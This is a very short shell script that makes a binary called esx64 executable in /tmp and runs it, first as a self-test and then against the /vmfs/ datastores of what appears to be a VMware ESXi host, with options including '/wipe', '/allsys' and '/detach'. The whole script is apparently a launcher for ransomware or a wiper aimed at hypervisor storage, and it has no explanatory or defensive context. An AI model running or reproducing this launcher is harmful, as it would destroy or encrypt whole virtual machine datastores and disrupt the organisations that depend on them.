#!/bin/sh
true
chmod +x /tmp/esx64
true
./tmp/esx64 /selftest
./tmp/esx64 /p /vmfs/ /depth 5 /wipe /allsys /detach /-showvolumes
